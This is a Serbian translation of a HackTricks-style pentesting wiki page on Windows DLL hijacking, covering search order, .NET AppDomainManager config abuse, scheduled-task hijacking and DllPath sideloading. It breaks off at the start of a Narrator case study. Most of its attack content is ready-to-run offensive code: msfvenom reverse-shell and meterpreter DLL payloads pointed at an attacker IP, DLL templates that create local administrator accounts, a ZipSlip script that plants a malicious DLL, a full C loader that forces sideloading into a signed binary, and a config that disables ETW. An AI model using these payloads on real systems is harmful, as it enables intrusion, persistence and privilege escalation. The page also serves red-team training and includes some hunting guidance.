# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulisanje pouzdanom aplikacijom tako da učita zlonamerni DLL. Ovaj termin obuhvata nekoliko taktika, kao što su **DLL Spoofing, Injection i Side-Loading**. Uglavnom se koristi za izvršavanje koda, ostvarivanje persistence i, ređe, privilege escalation. Iako je ovde fokus na escalation, metoda hijacking-a ostaje ista bez obzira na cilj.

### Uobičajene tehnike

Za DLL hijacking koristi se nekoliko metoda, a njihova efikasnost zavisi od načina na koji aplikacija učitava DLL-ove:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zamena legitimnog DLL-a zlonamernim, uz opcionalnu upotrebu DLL Proxying-a radi očuvanja funkcionalnosti originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u putanju pre legitimnog, iskorišćavanjem obrasca pretrage koji koristi aplikacija.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a koji aplikacija treba da učita, verujući da je reč o nepostojećem obaveznom DLL-u.
4. **DLL Redirection**: Izmena parametara pretrage, kao što su `%PATH%` ili `.exe.manifest` / `.exe.local` datoteke, kako bi se aplikacija usmerila na zlonamerni DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernom verzijom u WinSxS direktorijumu, metodom koja se često povezuje sa DLL side-loading-om.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum pod kontrolom korisnika zajedno sa kopiranom aplikacijom, što podseća na tehnike Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading nije jedini način da pouzdani **.NET Framework** proces učita attacker kod. Ako je ciljni executable **managed** aplikacija, CLR takođe proverava **application configuration file** imenovan prema executable-u (na primer `Setup.exe.config`). Ta datoteka može da definiše prilagođeni **AppDomainManager**. Ako konfiguracija upućuje na attacker-controlled assembly postavljen pored EXE-a, CLR ga učitava **pre uobičajenog putanje koda aplikacije** i izvršava unutar pouzdanog procesa.<sup>[[24]](#references)</sup>

Prema Microsoft-ovoj .NET Framework configuration schema, i `<appDomainManagerAssembly>` i `<appDomainManagerType>` moraju biti prisutni da bi se prilagođeni manager koristio.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracija:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimalni menadžer:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktične napomene:
- Ovo je tradecraft specifičan za **.NET Framework**. Zavisi od parsiranja CLR konfiguracije, a ne od redosleda pretrage Win32 DLL-ova.
- Host zaista mora biti **managed EXE**. Brza provera: `sigcheck -m target.exe`, `corflags target.exe` ili provera **CLR Runtime Header**-a u PE metapodacima.
- Naziv konfiguracione datoteke mora tačno odgovarati nazivu izvršne datoteke (`<binary>.config`) i obično se nalazi **pored EXE datoteke**.
- Ovo je korisno sa **potpisanim Microsoft/vendor binarnim datotekama**, jer pouzdani EXE ostaje neizmenjen, dok se zlonamerni managed assembly izvršava unutar istog procesa.
- Ako već imate direktorijum za instalaciju/ažuriranje u koji je moguće upisivati, AppDomainManager hijacking može da se koristi kao **prva faza**, nakon čega slede klasični DLL sideloading ili reflective loading za naredne faze.

### AppDomainManager kao downloader + bootstrap za scheduled task

Praktičan obrazac upada jeste kombinovanje pouzdanog managed EXE-a sa zlonamernim `*.config` fajlom i zlonamernim AppDomainManager DLL-om koji služi samo kao **mali bootstrapper**:<sup>[[25]](#references)</sup>

1. Korisnik pokreće potpisani .NET installer ili updater iz uverljive lokacije, kao što je `%USERPROFILE%\Downloads`.
2. Konfiguracija koja se nalazi pored EXE-a navodi CLR da učita attacker assembly **pre** nego što počne legitimna logika aplikacije.
3. Zlonamerni manager vrši **proveru putanje** (na primer, nastavlja samo ako se host EXE izvršava iz direktorijuma `Downloads`, a drugoj fazi dozvoljava izvršavanje samo iz `%LOCALAPPDATA%`).
4. Ako provera uspe, preuzima pravi payload u putanju u koju korisnik može da upisuje, kao što je `%LOCALAPPDATA%\PerfWatson2.exe`, i uspostavlja persistence pomoću scheduled task-a.

Zašto je ova varijanta važna:
- Potpisani host EXE ostaje neizmenjen, pa triage koji proverava samo hash glavnog binarnog fajla može da propusti kompromitaciju.
- Jednostavan **path-based anti-analysis** je uobičajen: premeštanje ZIP/EXE/DLL trijade na Desktop, Temp ili putanju sandbox-a može namerno prekinuti lanac.
- Prvostepeni AppDomainManager DLL može ostati mali i sa malo šuma, dok se pravi implant preuzima kasnije.

Minimalni primer persistence-a koji se često viđa uz ovaj obrazac:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Napomene:
- ` /rl highest` znači **najviši dostupni nivo** za tog korisnika/sesiju; sam po sebi ne garantuje eskalaciju na SYSTEM.
- Ovu tehniku je često preciznije klasifikovati kao **execution/persistence putem zloupotrebe .NET konfiguracije**, a ne kao klasični hijacking redosleda pretrage za nedostajućim DLL-om, iako operatori često kombinuju oba pristupa.

Tačke za detekciju:
- Potpisani .NET executable fajlovi pokrenuti iz **ZIP extraction putanja**, `Downloads`, `%TEMP%` ili drugih foldera u koje korisnik može da upisuje, uz **colocated** `<exe>.config`.
- Novi scheduled tasks čija akcija pokazuje na `%LOCALAPPDATA%`, `%APPDATA%` ili `Downloads`, sa imenima koja oponašaju browser/vendor updatere.
- Kratkotrajni managed bootstrap procesi koji odmah preuzimaju drugi EXE, a zatim pokreću `schtasks.exe`.
- Uzorci koji se rano završavaju osim ako putanja do executable fajla odgovara očekivanom direktorijumu korisničkog profila.

### Hijacking postojećeg scheduled task-a radi ponovnog pokretanja sideload lanca

Radi persistence-a, nemojte tražiti samo **kreiranje novog task-a**. Neki intrusion set-ovi čekaju da legitimni installer kreira **normalan updater task**, a zatim **prepišu task action** tako da postojeći naziv, autor i trigger ostanu poznati defenderima.

Workflow koji se može ponovo koristiti:
1. Instalirajte/pokrenite legitimni software i identifikujte task koji on obično kreira.
2. Exportujte task XML i zabeležite trenutne vrednosti `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zamenite samo action tako da task pokreće vaš **trusted host EXE** iz staging direktorijuma u koji korisnik može da upisuje; taj EXE zatim side-load-uje ili AppDomain-load-uje stvarni payload.
4. Ponovo registrujte isti naziv task-a umesto kreiranja novog očiglednog persistence artefakta.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Zašto je prikrivenije:
- Naziv zadatka i dalje može izgledati legitimno (na primer, updater dobavljača).
- **Task Scheduler service** ga pokreće, pa validacija roditelja/predaka često vidi očekivani lanac zakazivanja umesto `explorer.exe`.
- DFIR timovi koji traže samo **nove nazive zadataka** mogu propustiti zadatak čija je registracija već postojala, ali čija akcija sada pokazuje na `%LOCALAPPDATA%`, `%APPDATA%` ili drugu putanju pod kontrolom napadača.

Brzi pivot-i za hunting:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Uporedite XML datoteke `C:\Windows\System32\Tasks\*` i metapodatke `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` sa osnovnim stanjem.
- Generišite upozorenje kada **updater task koji izgleda kao da pripada dobavljaču** izvršava kod iz **direktorijuma u koje korisnik može da upisuje** ili pokreće .NET EXE sa pratećom `*.config` datotekom.

> [!TIP]
> Za lanac koraka koji kombinuje HTML staging, AES-CTR konfiguracije i .NET implant-e sa DLL sideloading-om, pogledajte workflow u nastavku.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Pronalaženje DLL-ova koji nedostaju

Najčešći način za pronalaženje DLL-ova koji nedostaju unutar sistema jeste pokretanje alata [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals-a i **postavljanje** **sledeća 2 filtera**:

![Uobičajene tehnike - Pronalaženje DLL-ova koji nedostaju: Najčešći način za pronalaženje DLL-ova koji nedostaju unutar sistema jeste pokretanje alata procmon iz sysinternals-a i postavljanje sledeća 2 filtera](<../../../images/image (961).png>)

![Uobičajene tehnike - Pronalaženje DLL-ova koji nedostaju: Najčešći način za pronalaženje DLL-ova koji nedostaju unutar sistema jeste pokretanje alata procmon iz sysinternals-a i postavljanje sledeća 2 filtera](<../../../images/image (230).png>)

i samo prikazivanje **File System Activity**:

![Uobičajene tehnike - Pronalaženje DLL-ova koji nedostaju: i samo prikazivanje aktivnosti sistema datoteka](<../../../images/image (153).png>)

Ako tražite **DLL-ove koji generalno nedostaju**, ostavite ovo pokrenuto nekoliko **sekundi**.\
Ako tražite **DLL koji nedostaje unutar određenog izvršnog fajla**, postavite još jedan filter, kao što je **"Process Name" "contains" `<exec name>`**, pokrenite ga i zaustavite hvatanje događaja.<sup>[[9]](#references)</sup>

## Exploiting DLL-ova koji nedostaju

Da biste eskalirali privilegije, potražite **DLL koji privilegovani proces pokušava da učita** sa lokacije u koju možete da upisujete. To se može dogoditi kada kontrolišete direktorijum koji se pretražuje pre direktorijuma koji sadrži legitimni DLL ili kada traženi DLL ne postoji, a možete da upisujete u jedan od pretraživanih direktorijuma.

### Redosled pretrage DLL-ova

**U** [**Microsoft dokumentaciji**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći kako se DLL-ovi konkretno učitavaju.**

**Windows aplikacije** traže DLL-ove prateći skup **unapred definisanih putanja pretrage**, određenim redosledom. Problem DLL hijacking-a nastaje kada se maliciozni DLL strateški postavi u jedan od ovih direktorijuma, čime se obezbeđuje da bude učitan pre autentičnog DLL-a. Rešenje za sprečavanje ovoga jeste da aplikacija koristi apsolutne putanje kada navodi DLL-ove koji su joj potrebni.

Redosled **pretrage DLL-ova na 32-bitnim** sistemima prikazan je u nastavku:

1. Direktorijum iz kojeg je aplikacija učitana.
2. Sistemski direktorijum. Koristite funkciju [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) da biste dobili putanju ovog direktorijuma.(_C:\Windows\System32_)
3. 16-bitni sistemski direktorijum. Ne postoji funkcija koja dobavlja putanju ovog direktorijuma, ali se on pretražuje. (_C:\Windows\System_)
4. Windows direktorijum. Koristite funkciju [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) da biste dobili putanju ovog direktorijuma.
1. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi navedeni u PATH environment variable-u. Imajte na umu da ovo ne uključuje putanju po aplikaciji navedenu registarskim ključem **App Paths**. Ključ **App Paths** se ne koristi prilikom izračunavanja putanje za pretragu DLL-ova.

To je **podrazumevani** redosled pretrage kada je **SafeDllSearchMode** omogućen. Kada je onemogućen, trenutni direktorijum se pomera na drugo mesto. Da biste onemogućili ovu funkciju, kreirajte registarsku vrednost **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućena).

Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.

Konačno, DLL se može učitati apsolutnom putanjom umesto imenom. U tom slučaju Windows traži sam DLL samo na toj putanji; zavisnosti zahtevane imenom i dalje prate odgovarajući redosled pretrage.

Postoje i drugi načini za menjanje načina na koji se redosled pretrage menja, ali ih ovde neću objašnjavati.

### Uvezivanje proizvoljnog upisa u datoteku sa hijacking-om DLL-a koji nedostaje

1. Koristite **ProcMon** filtere (`Process Name` = ciljni EXE, `Path` se završava sa `.dll`, `Result` = `NAME NOT FOUND`) da biste prikupili nazive DLL-ova koje proces traži, ali ne može da pronađe.<sup>[[14]](#references)</sup>
2. Ako se binary pokreće **po rasporedu ili kao service**, postavljanje DLL-a sa jednim od tih naziva u **direktorijum aplikacije** (stavka broj 1 u redosledu pretrage) dovešće do njegovog učitavanja pri sledećem izvršavanju. U jednom slučaju sa .NET scanner-om, proces je tražio `hostfxr.dll` u `C:\samples\app\` pre učitavanja stvarne kopije iz `C:\Program Files\dotnet\fxr\...`.
3. Napravite payload DLL (npr. reverse shell) sa bilo kojim export-om: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ako je vaš primitive **arbitrary write u stilu ZipSlip-a**, napravite ZIP čiji entry izlazi iz direktorijuma za ekstrakciju tako da DLL bude postavljen u direktorijum aplikacije:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostavite arhivu u nadzirani inbox/share; kada scheduled task ponovo pokrene proces, on učitava malicious DLL i izvršava vaš kod u kontekstu service account-a.

### Forsiranje sideloading-a putem RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način za deterministički uticaj na DLL search path novokreiranog procesa jeste podešavanje polja DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa pomoću ntdll native API-ja. Navođenjem direktorijuma kojim upravlja napadač, ciljni proces koji razrešava imported DLL po imenu (bez apsolutne putanje i bez korišćenja safe loading flags) može biti primoran da učita malicious DLL iz tog direktorijuma.

Glavna ideja
- Izgradite process parameters pomoću RtlCreateProcessParametersEx i navedite prilagođeni DllPath koji pokazuje na vaš kontrolisani folder (npr. direktorijum u kojem se nalaze vaš dropper/unpacker).
- Kreirajte proces pomoću RtlCreateUserProcess. Kada ciljni binary razrešava DLL po imenu, loader će tokom razrešavanja proveriti prosleđeni DllPath, čime se omogućava pouzdan sideloading čak i kada se malicious DLL ne nalazi u istom direktorijumu kao ciljni EXE.

Napomene/ograničenja
- Ovo utiče na child proces koji se kreira; razlikuje se od SetDllDirectory, koji utiče samo na trenutni proces.
- Cilj mora importovati ili pozvati LoadLibrary za DLL po imenu (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodovane apsolutne putanje ne mogu biti hijack-ovane. Forwarded exports i SxS mogu promeniti prioritet.

Minimalni C primer (ntdll, wide strings, pojednostavljeno rukovanje greškama):

<details>
<summary>Kompletan C primer: forsiranje DLL sideloading-a putem RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Primer operativne upotrebe
- Postavite zlonamerni xmllite.dll (koji izvozi zahtevane funkcije ili prosleđuje pozive stvarnom DLL-u) u svoj DllPath direktorijum.
- Pokrenite potpisani binary za koji je poznato da pomoću navedene tehnike po imenu traži xmllite.dll. Loader razrešava import preko prosleđenog DllPath-a i sideloaduje vaš DLL.

Ova tehnika je primećena in-the-wild u višestepenim sideloading lancima: početni launcher postavlja pomoćni DLL, koji zatim pokreće Microsoft-potpisani binary podložan hijack-u, sa prilagođenim DllPath-om kako bi se forsiralo učitavanje napadačevog DLL-a iz staging direktorijuma.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

Za **.NET Framework** targete, sideloading se može izvršiti **pre `Main()`** bez patchovanja memorije zloupotrebom susednog **`.exe.config`** fajla aplikacije. Umesto oslanjanja isključivo na redosled pretrage Win32 DLL-ova, napadač postavlja legitiman .NET EXE pored zlonamernog config fajla i jednog ili više assembly-ja pod kontrolom napadača.

Kako lanac funkcioniše:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE se pokreće, a **CLR čita `<exe>.config`**.
2. Config postavlja **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`**, tako da runtime instancira `AppDomainManager` pod kontrolom napadača.
3. Zlonamerni manager dobija **pre-`Main()` izvršavanje** unutar pouzdanog host procesa.
4. Isti config može da natera CLR da najpre razrešava lokalne assembly-je (na primer `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) i može da oslabi runtime validaciju/telemetriju bez inline patchovanja.

Obrazac nalik kampanjama (tačno ugnježđavanje može da varira u zavisnosti od direktive / CLR verzije):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Zašto je ovo korisno:
- **`<probing privatePath="."/>`** zadržava assembly resolution u direktorijumu aplikacije, pretvarajući folder u predvidljivu sideloading površinu.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** preusmeravaju izvršavanje u attacker kod tokom CLR inicijalizacije, pre nego što se pokrene legitimna logika aplikacije.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** može omogućiti full-trust aplikaciji da učita unsigned ili izmenjene assemblies bez greške pri strong-name validaciji.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** izbegava publisher-policy redirects ka novijim assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** čini izbor runtime-a determinističkijim.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** je naročito zanimljiv zato što **CLR onemogućava sopstvenu ETW vidljivost** iz konfiguracije, umesto da implant u memoriji menja `EtwEventWrite`.

Operativni obrazac uočen u novijim kampanjama:
- Stage 1 postavlja `setup.exe`, `setup.exe.config` i lokalne assemblies.
- Stage 2 ih kopira u uverljiv **AppData update** folder, preimenuje host u nešto poput `update.exe` i ponovo ga pokreće putem **scheduled task**-a.
- Stage 3 proverava kontekst izvršavanja, na primer očekivani parent `svchost.exe` iz Task Scheduler-a, pre učitavanja finalnog RAT DLL/export-a.

Ideje za hunting:
- Potpisani ili na drugi način legitimni **.NET executable-i** koji se pokreću sa sumnjivim susednim **`.config`** fajlovima na lokacijama u koje korisnik može da upisuje.
- `.config` fajlovi koji sadrže **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ili **`etwEnable enabled="false"`**.
- Scheduled tasks koji ponovo pokreću preimenovane update binaries iz **`%LOCALAPPDATA%`** ili app-specific `\bin\update\` direktorijuma.
- Parent/child lanci u kojima scheduled task pokreće pouzdani .NET host koji odmah učitava assemblies koji nisu od vendora iz sopstvenog direktorijuma.

#### Izuzeci za redosled pretrage dll-ova iz Windows dokumentacije

Određeni izuzeci standardnom redosledu pretrage DLL-ova navedeni su u Windows dokumentaciji:

- Kada se naiđe na **DLL koji ima isto ime kao DLL koji je već učitan u memoriji**, sistem zaobilazi uobičajenu pretragu. Umesto toga proverava redirection i manifest, a zatim kao podrazumevanu opciju koristi DLL koji je već u memoriji. **U ovom scenariju sistem ne obavlja pretragu DLL-a**.
- U slučajevima kada je DLL prepoznat kao **known DLL** za aktuelnu verziju Windows-a, sistem će koristiti svoju verziju known DLL-a, zajedno sa svim njegovim dependent DLL-ovima, **preskačući proces pretrage**. Registry ključ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih known DLL-ova.
- Ako **DLL ima dependencies**, pretraga tih dependent DLL-ova obavlja se kao da su navedeni samo svojim **module names**, bez obzira na to da li je početni DLL identifikovan korišćenjem pune putanje.

### Eskalacija privilegija

**Zahtevi**:

- Identifikujte proces koji radi ili će raditi sa **drugačijim privilegijama** (horizontalno ili lateralno kretanje), a kojem **nedostaje DLL**.
- Obezbedite **write access** za bilo koji **direktorijum** u kojem će se **DLL** pretraživati. To može biti direktorijum executable-a ili direktorijum unutar system path-a.

Ovi preduslovi po podrazumevanim postavkama nisu uobičajeni: privilegovani executable-i obično nemaju missing DLL dependencies, a standardni korisnici obično ne mogu da upisuju u direktorijume system search path-a. Pogrešno konfigurisana okruženja ipak mogu izložiti oba uslova.\
Ako su zahtevi ispunjeni, proverite projekat [UACME](https://github.com/hfiref0x/UACME). Iako mu je glavni cilj UAC bypass, sadrži DLL-hijacking PoC-ove za određene verzije Windows-a koji se često mogu prilagoditi writable direktorijumu koji ste pronašli.

Imajte na umu da možete **proveriti svoje dozvole u folderu** pomoću:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole svih fascikli unutar PATH-a**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti imports izvršne datoteke i exports dll-a pomoću:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za kompletan vodič o tome kako **zloupotrebiti Dll Hijacking za eskalaciju privilegija** uz dozvole za upis u fasciklu **System Path** proverite:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatizovani alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate dozvole za upis u bilo koju fasciklu unutar system PATH-a.\
Drugi zanimljivi automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit funkcije**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Primer

Ako pronađete scenarijo koji je moguće iskoristiti, jedna od najvažnijih stvari za uspešnu eksploataciju bila bi da **kreirate dll koji eksportuje barem sve funkcije koje će izvršna datoteka uvesti iz njega**. U svakom slučaju, imajte na umu da je Dll Hijacking koristan za [eskalaciju sa nivoa Medium Integrity na High **(zaobilaženjem UAC-a)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili sa[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)**.** Primer **kako kreirati validan dll** možete pronaći u ovoj studiji o dll hijacking-u, fokusiranoj na dll hijacking za izvršavanje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Pored toga, u **sledećem odeljku** možete pronaći neke **osnovne dll kodove** koji mogu biti korisni kao **šabloni** ili za kreiranje **dll-a sa eksportovanim funkcijama koje nisu obavezne**.

## **Kreiranje i kompajliranje Dll-ova**

### **Dll Proxifying**

U osnovi, **Dll proxy** je Dll sposoban da **izvrši vaš zlonamerni kod kada se učita**, ali i da **izloži** i **funkcioniše** kako je **očekivano**, tako što **prosleđuje sve pozive stvarnoj biblioteci**.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete da **navedete izvršnu datoteku i izaberete biblioteku** koju želite da proxify-ujete i **generišete proxified dll** ili da **navedete Dll** i **generišete proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Nabavite meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreiraj korisnika (x86, nisam video x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Sopstveni

U mnogim slučajevima, DLL koji kompajlirate mora da **izveze svaku funkciju koju uvozi proces žrtve**. Ako nedostaje potreban export, binarni fajl ne može da ga razreši i exploit neće uspeti.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativni C DLL sa ulaznom tačkom niti</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe i dalje pri pokretanju proverava predvidljivu, jezički specifičnu localization DLL datoteku koja može biti hijacked za proizvoljno izvršavanje koda i persistence.<sup>[[7]](#references)</sup>

Ključne činjenice
